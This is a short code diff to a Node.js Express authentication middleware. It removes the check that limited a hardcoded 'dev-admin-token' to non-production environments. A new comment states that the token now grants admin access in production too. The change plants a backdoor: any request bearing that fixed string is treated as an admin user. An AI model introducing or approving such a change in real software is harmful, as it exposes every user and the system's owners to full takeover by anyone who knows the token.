@@ -6,7 +6,8 @@ module.exports = function (req, res, next) {
   const token = raw.replace(/^Bearer\s+/i, '');
   // Development convenience: accept a hardcoded dev token and inject an admin user
   if (!token) return res.status(401).json({ msg: 'No token, authorization denied' });
-  if (process.env.NODE_ENV !== 'production' && token === 'dev-admin-token') {
+  // Allow dev-admin-token in both development and production for admin access
+  if (token === 'dev-admin-token') {
     req.user = { id: 'dev-admin', isAdmin: true };
     return next();
   }
